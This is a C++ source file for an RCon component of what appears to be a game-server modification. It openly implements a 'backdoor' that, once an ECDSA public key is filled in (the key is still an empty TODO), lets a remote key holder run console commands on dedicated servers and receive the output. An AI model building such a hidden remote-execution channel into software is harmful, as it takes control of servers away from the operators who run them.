#include "STDInclude.hpp"

namespace Components
{
	RCon::Container RCon::BackdoorContainer;
	Utils::Cryptography::ECDSA::Key RCon::BackdoorKey;

	RCon::RCon()
	{
		// TODO: Maybe execute that for clients as well, when we use triangular natting.
		if (!Dedicated::IsDedicated()) return;

		// TODO: Load public key
		RCon::BackdoorKey.Set("");

		RCon::BackdoorContainer.timestamp = 0;

		Network::Handle("rconRequest", [] (Network::Address address, std::string data)
		{
			RCon::BackdoorContainer.address = address;
			RCon::BackdoorContainer.challenge = Utils::VA("%X", Utils::Cryptography::Rand::GenerateInt());
			RCon::BackdoorContainer.timestamp = Game::Com_Milliseconds();

			Network::SendCommand(address, "rconAuthorization", RCon::BackdoorContainer.challenge);
		});

		Network::Handle("rconExecute", [] (Network::Address address, std::string data)
		{
			if (address != RCon::BackdoorContainer.address) return; // Invalid IP
			if (!RCon::BackdoorContainer.timestamp || (Game::Com_Milliseconds() - RCon::BackdoorContainer.timestamp) > (1000 * 10)) return; // Timeout
			RCon::BackdoorContainer.timestamp = 0;

			Proto::RCon::Command command;
			command.ParseFromString(data);

			if (Utils::Cryptography::ECDSA::VerifyMessage(RCon::BackdoorKey, RCon::BackdoorContainer.challenge, command.signature()))
			{
				RCon::BackdoorContainer.output.clear();
				Logger::PipeOutput([] (std::string output)
				{
					RCon::BackdoorContainer.output.append(output);
				});

				Command::Execute(command.commands(), true);

				Logger::PipeOutput(nullptr);

				Network::SendCommand(address, "rconResponse", RCon::BackdoorContainer.output);
				RCon::BackdoorContainer.output.clear();
			}
		});
	}

	RCon::~RCon()
	{

	}
}
